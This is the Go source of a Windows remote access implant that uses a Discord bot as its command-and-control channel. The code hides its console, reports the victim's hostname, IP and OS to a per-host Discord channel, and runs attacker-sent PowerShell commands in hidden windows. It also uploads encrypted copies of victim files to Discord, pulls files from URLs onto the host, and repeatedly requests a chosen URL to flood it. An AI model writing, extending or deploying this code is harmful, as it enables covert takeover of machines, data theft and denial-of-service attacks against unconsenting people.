package main

import (
	"bufio"
	"fmt"
	"os"
	"os/exec"
	"os/signal"
	"regexp"
	"runtime"
	"strconv"
	"strings"
	"syscall"
	"time"

	"DiscordGo/pkg/agent"
	"DiscordGo/pkg/util"

	"github.com/bwmarrin/discordgo"
)

var newAgent *agent.Agent
var channelID *discordgo.Channel

// Create an Agent with all the necessary information
func init() {

	newAgent = &agent.Agent{}
	newAgent.HostName, _ = os.Hostname()
	newAgent.IP = agent.GetLocalIP()

	sys := "Unknown"
	if runtime.GOOS == "windows" {
		sys = "Windows"
	} else {
		os.Exit(1)
	}

	newAgent.OS = sys
}

func HConsole() int {
	FreeConsole := syscall.NewLazyDLL("kernel32.dll").NewProc("FreeConsole")
	FreeConsole.Call()
	return 0
}

// checksIfVM
// func amVisor() bool {
// 	result, _ := vmdetect.CommonChecks()
// 	return result
// }

func main() {
	HConsole()
	// if amVisor() {
	// 	os.Mkdir("FuckThis", 0777)
	// 	os.Exit(1)
	// }
	util.GetKeys()
	// TODO Do a check on the constant and produce a good error
	dg, err := discordgo.New("Bot " + util.BotToken)
	if err != nil {
		//fmt.Println("error creating Discord session,", err)
		return
	}

	channelID, _ = dg.GuildChannelCreate(util.ServerID, newAgent.IP, 0)
	// fmt.Println("[+]Server ID: " + util.ServerID)
	// fmt.Print("[+]Channel ID: ")
	// fmt.Println(channelID)

	sendMessage := "``` Hostname: " + newAgent.HostName + "\n IP:" + newAgent.IP + "\n OS:" + newAgent.OS + "```"
	message, _ := dg.ChannelMessageSend(channelID.ID, sendMessage)
	//fmt.Print("[+]Host Info Sent !")
	dg.ChannelMessagePin(channelID.ID, message.ID)
	dg.AddHandler(messageCreater)

	go func(dg *discordgo.Session) {
		ticker := time.NewTicker(time.Duration(5) * time.Minute)
		for {
			<-ticker.C
			go heartBeat(dg)
		}
	}(dg)

	// Open a websocket connection to Discord and begin listening.
	err = dg.Open()
	if err != nil {
		return
	}

	// Wait here until CTRL-C or other term signal is received.
	sc := make(chan os.Signal, 1)
	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt, syscall.SIGTERM)
	<-sc

	// Delete a channel
	dg.ChannelDelete(channelID.ID)

	// Cleanly close down the Discord session.
	dg.Close()

}

// This function is where we define custom commands for discordgo and system commands for the target
func messageCreater(dg *discordgo.Session, message *discordgo.MessageCreate) {
	var re = regexp.MustCompile(`(?m)<@&\d{18}>`)

	// Special case
	if message.Author.Bot {
		if message.Content == "kill" {
			dg.ChannelDelete(channelID.ID)
			os.Exit(0)
		}
	}

	// Another special case
	if len(message.MentionRoles) > 0 {
		message_content := strings.Trim(re.ReplaceAllString(message.Content, ""), " ")
		// PUT THIS IS A FUNCTION\
		if message.ChannelID == channelID.ID {
			//fmt.Println(message_content)
			output := executeCommand(message_content)
			if output == "" {
				dg.ChannelMessageSend(message.ChannelID, "[-]Command didn't return anything")
			} else {
				batch := ""
				counter := 0
				largeOutputChunck := []string{}
				for char := 0; char < len(output); char++ {
					if counter < 2000 && char < len(output)-1 {
						batch += string(output[char])
						counter++
					} else {
						if char == len(output)-1 {
							batch += string(output[char])
						}
						largeOutputChunck = append(largeOutputChunck, batch)
						batch = string(output[char])
						counter = 1
					}
				}

				for _, chunck := range largeOutputChunck {
					dg.ChannelMessageSend(message.ChannelID, "```"+chunck+"```")
				}
			}
		}
	}

	if !message.Author.Bot {
		if message.ChannelID == channelID.ID {
			if message.Content == "ping" {
				dg.ChannelMessageSend(message.ChannelID, "↑")
			} else if strings.HasPrefix(message.Content, "sendGet") {
				commandBreakdown := strings.Fields(message.Content)
				if strings.Contains(commandBreakdown[1], "http") && len(commandBreakdown) == 3 { //If you supply a non int value program crashes. Handle that case later.
					itterations, err := strconv.Atoi(commandBreakdown[2])
					if err != nil {
						os.Exit(1)
					}
					for i := 0; i < itterations; i++ {
						code := util.SendGET(commandBreakdown[1])
						if code != 200 {
							dg.ChannelMessageSend(message.ChannelID, "[-]Exiting mode. Server returned: "+strconv.Itoa(code))
							break
						}
						if message.ChannelID == channelID.ID {
							if message.Content == "stop" {
								dg.ChannelMessageSend(message.ChannelID, "[+]Closing the flood gates ...")
								break
							}
						}
						dg.ChannelMessageSend(message.ChannelID, "[*]Get Req Sent ...")
					}
				} else {
					dg.ChannelMessageSend(message.ChannelID, "[-]Usage: http[:]//urltohit[.]xyz <HowManyTimes>")
				}
			} else if message.Content == "kill" {
				dg.ChannelDelete(channelID.ID)
				os.Exit(0)
			} else if strings.HasPrefix(message.Content, "cd") {
				commandBreakdown := strings.Fields(message.Content)
				os.Chdir(commandBreakdown[1])
				dg.ChannelMessageSend(message.ChannelID, "```[+]Directory changed to "+commandBreakdown[1]+"```")
			} else if strings.HasPrefix(message.Content, "download") {
				commandBreakdown := strings.Fields(message.Content)
				if len(commandBreakdown) == 1 {
					dg.ChannelMessageSend(message.ChannelID, "[*]Please specify file(s): download /etc/passwd")
					return
				} else {
					files := commandBreakdown[1:]
					for _, file := range files {
						fileReader, err := os.Open(file)
						if err != nil {
							dg.ChannelMessageSend(message.ChannelID, "[-]Could not open file: "+file)
						} else {
							encFilePath, err := util.EncrFile(file, util.AesKey)
							if err != nil {
								dg.ChannelMessageSend(message.ChannelID, "[-]Could not manipulate the file")
							} else {
								fileReader.Close()
								fileReader, err = os.Open(encFilePath)
								if err != nil {
									dg.ChannelMessageSend(message.ChannelID, "[-]Could not manipulate the file")
								} else {
									dg.ChannelFileSend(message.ChannelID, encFilePath, bufio.NewReader(fileReader))
									defer fileReader.Close()
									//os.Remove(encFilePath)
								}
							}
						}
					}
				}
			} else if strings.HasPrefix(message.Content, "upload") {
				commandBreakdown := strings.Split(message.Content, " ")
				if len(commandBreakdown) == 1 {
					dg.ChannelMessageSend(message.ChannelID, "[*]Please specify the file: upload /etc/ssh/sshd_config(with attached file) or upload http://example.com/test.txt /tmp/test.txt")
					return
				} else if len(commandBreakdown) == 2 { // upload /etc/ssh/sshd_config(with attached file)
					fileDownloadPath := commandBreakdown[1]
					if len(message.Attachments) == 0 { // With out this, the program will crash, can be used for debugging
						dg.ChannelMessageSend(message.ChannelID, "[-]No file was attached!")
						return
					}
					util.DownloadFile(fileDownloadPath, message.Attachments[0].URL)
				} else { // upload http://example.com/test.txt /tmp/test.txt
					util.DownloadFile(commandBreakdown[2], commandBreakdown[1])
				}
			} else {
				output := executeCommand(message.Content)
				if output == "" {
					dg.ChannelMessageSend(message.ChannelID, "[-]Command didn't return anything")
				} else {
					batch := ""
					counter := 0
					largeOutputChunck := []string{}
					for char := 0; char < len(output); char++ {
						if counter < 2000 && char < len(output)-1 {
							batch += string(output[char])
							counter++
						} else {
							if char == len(output)-1 {
								batch += string(output[char])
							}
							largeOutputChunck = append(largeOutputChunck, batch)
							batch = string(output[char])
							counter = 1
						}
					}

					for _, chunck := range largeOutputChunck {
						dg.ChannelMessageSend(message.ChannelID, "```"+chunck+"```")
					}
				}
			}
		}
	}
}

func heartBeat(dg *discordgo.Session) {
	dg.ChannelMessageSend(channelID.ID, fmt.Sprintf("❤️"))
}

func executeCommand(command string) string {
	args := ""
	result := ""
	var shell, flag string
	var testcmd = command
	shell = "powershell"
	flag = "/c"

	// Seperate args from command
	ss := strings.Split(command, " ")
	command = ss[0]

	if len(ss) > 1 {
		for i := 1; i < len(ss); i++ {
			args += ss[i] + " "
		}
		args = args[:len(args)-1] // I HATEEEEEEEE GOLANGGGGGG
	}
	if args == "" {
		ps_instance := exec.Command(shell, flag, command)
		ps_instance.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		output, err := ps_instance.Output()
		if err != nil {
			// maybe send error to server ???
			fmt.Println(err.Error())
			fmt.Println("Couldn't execute command")
		}
		result = string(output)
	} else {
		ps_instance := exec.Command(shell, flag, testcmd)
		ps_instance.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		output, err := ps_instance.Output()
		if err != nil {
			// maybe send error to server ??? nah
			fmt.Println(err.Error())
			fmt.Println("Couldn't execute command")
		}
		result = string(output)
	}
	return result
}
